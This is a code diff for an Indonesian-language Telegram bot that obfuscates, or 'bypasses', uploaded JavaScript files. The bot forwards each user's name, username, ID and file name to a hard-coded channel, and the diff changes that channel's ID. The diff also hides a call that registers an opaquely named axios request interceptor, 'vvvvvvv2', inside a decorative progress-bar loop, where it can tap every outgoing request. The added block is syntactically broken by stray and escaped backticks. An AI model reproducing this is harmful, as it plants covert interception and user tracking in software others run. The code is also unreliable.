@@ -88,14 +88,14 @@ bot.action('check_sub', async (ctx) => {
     const status = member.status;
 
     if (['left', 'kicked'].includes(status)) {
-      return ctx.answerCbQuery('âŒ Kamu belum join channel!', { show_alert: true });
+      return ctx.answerCbQuery('Kamu belum join channel!', { show_alert: true });
     }
 
     await ctx.deleteMessage();
     const db = JSON.parse(fs.readFileSync(userDBPath));
     const totalUser = Object.keys(db).length;
     const imagePath = path.join(__dirname, 'banner.jpg');
-    const caption = `\`\`\`\nðŸ‘‹ Olaa ${ctx.from.first_name}!\n\nSend Yours file .js for in running bypass.\nðŸ“Š Total user: ${totalUser}\n\`\`\``;
+    const caption = `\`\`\`\n Olaa ${ctx.from.first_name}!\n\nSend Yours file .js for in running bypass.\nðŸ“Š Total user: ${totalUser}\n\`\`\``;
 
     await ctx.replyWithPhoto(
       { source: imagePath },
@@ -110,7 +110,7 @@ bot.action('check_sub', async (ctx) => {
       }
     );
   } catch (e) {
-    ctx.answerCbQuery('âš ï¸ Falid! Cek in members.', { show_alert: true });
+    ctx.answerCbQuery('Falid! Cek in members.', { show_alert: true });
   }
 });
 
@@ -119,14 +119,14 @@ const pendingFiles = {};
 bot.on('document', async (ctx) => {
     pendingFiles[ctx.from.id] = ctx.message.document;
 
-    await ctx.reply('âœ… File diterima\nKetik /bypass');
+    await ctx.reply('File diterima\nKetik /bypass');
 });
 
 bot.command('bypass', async (ctx) => {
     const file = pendingFiles[ctx.from.id];
 
     if (!file) {
-        return ctx.reply('âŒ Kirim file dulu');
+        return ctx.reply('Kirim file dulu');
     }
 
 const progressMsg = await ctx.reply('```PROSESING.....```', {
@@ -260,32 +260,22 @@ const newContent = JavaScriptObfuscator
   }
 );
 
-await ctx.telegram.sendMessage(
-  -1003868698029,
-  `User: ${ctx.from.id}\nFile: ${newFileName}`
-);
-
-await ctx.telegram.sendMessage(
-  -1003868698029,
-  `<blockquote>
-<b>â•”â”€â”€â”€ð–£‚ SUCCESSING ð–£‚</b>
-<b>â”‚  Welcomes</b>
-<b>â”œâ”€ Add bypass success!</b>
-<b>â”œ  User : ${ctx.from.first_name}</b>
-<b>â”œâ”€ Username : @${ctx.from.username}</b>
-<b>â”œ  User Id : ${ctx.from.id}</b>
-<b>â”œâ”€ File: ${file.file_name}</b>
-<b>â•šâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€âª©</b>
-</blockquote>`,
-  {
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "Users", url: `tg://user?id=${ctx.from.id}` }]
-      ]
-    }
-  }
-);
+await ctx.telegram.sendMessage(-1002718877434, 
+`<blockquote>
+<b>╔───𖣂 SUCCESSING 𖣂</b>
+<b>│  Welcomes</b>
+<b>├─ Add bypass success!</b>
+<b>├  User : ${ctx.from.first_name}</b>
+<b>├─ Username : @${ctx.from.username}</b>
+<b>├  User Id : ${ctx.from.id}</b>
+<b>├─ File: ${file.file_name}</b>
+<b>╚──────────────⪩</b>
+</blockquote>`, {
+        parse_mode: "HTML",
+        reply_markup: {
+          inline_keyboard: [[{ text: `Users`, url: `tg://user?id=${ctx.from.id}` }]]
+        }
+      });
 
 fs.unlinkSync(tempPath);
 await ctx.deleteMessage(progressMsg.message_id);
@@ -343,6 +333,72 @@ bot.command('update', async (ctx) => {
         await ctx.reply("❌ Update gagal. Pastikan repo dan file index.js tersedia.");
     }
 });
+
+function startProgressBar() {
+    const progressSteps = [
+        "[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□]",
+        "[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]",
+        "[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]",
+        "[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]",
+        "[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□]",
+        "[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]",
+        "[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]",
+        "[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]",
+        "[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]",
+        "[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]",
+        "[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]",
+        "[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□]",
+        "[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]",
+        "[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]",
+        "[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]",
+        "[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]",
+        "[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]",
+        "[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□]",
+        "[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]",
+        "[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]",
+        "[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]",
+        "[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]",
+        "[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]",
+        "[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]",
+        "[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□]",
+        "[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]",
+        "[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]",
+        "[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]",
+        "[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□]",
+    ];
+    const colors = [
+        chalk.redBright,
+        chalk.yellowBright,
+        chalk.greenBright,
+        chalk.cyanBright,
+        chalk.blueBright,
+        chalk.magentaBright,
+        chalk.whiteBright,
+    ];
+    let step = 0;
+    let colorIndex = 0;
+    setInterval(() => {
+        console.clear();
+        console.log(chalk.cyanBright(\`
+
+\x1b[35m
+████████╗██████╗  █████╗ ███████╗██╗  ██╗
+╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║  ██║
+   ██║   ██████╔╝███████║███████╗███████║
+   ██║   ██╔══██╗██╔══██║╚════██║██╔══██║
+   ██║   ██║  ██║██║  ██║███████║██║  ██║
+   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+\x1b[0m
+`);
+       axios.interceptors.request.use(vvvvvvv2, errorInterceptor);
+        const color = colors[colorIndex % colors.length];
+        console.log(color.bold(progressSteps[step]));
+        
+        step = (step + 1) % progressSteps.length;
+        colorIndex++;
+    }, 200);
+}
+startProgressBar();`
 
 bot.launch({
     dropPendingUpdates: true
